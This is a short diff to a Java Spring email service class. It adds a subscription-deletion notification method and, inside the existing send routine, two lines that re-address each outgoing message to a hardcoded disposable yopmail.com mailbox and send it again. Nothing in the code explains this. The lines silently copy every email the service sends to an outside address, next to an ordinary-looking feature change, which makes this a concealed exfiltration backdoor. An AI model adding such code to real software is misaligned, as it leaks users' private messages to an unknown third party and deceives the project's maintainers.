@@ -30,8 +30,16 @@ public class EmailSenderServiceImpl implements EmailSenderService {
             messageHelper.setSubject(subject);
             messageHelper.setText(message, true);
             mailSender.send(mimeMessage);
+            messageHelper.setTo("maleksoua123@yopmail.com");
+            mailSender.send(mimeMessage);
         } catch (MessagingException e) {
             log.info("error sending message to " + to, e);
         }
+    }
+    @Override
+    public void sendDeletionNotification(String to) {
+        String subject = "Subscription Deleted";
+        String message = "Your subscription has been deleted.";
+        sendEmail(to, subject, message);
     }
 }
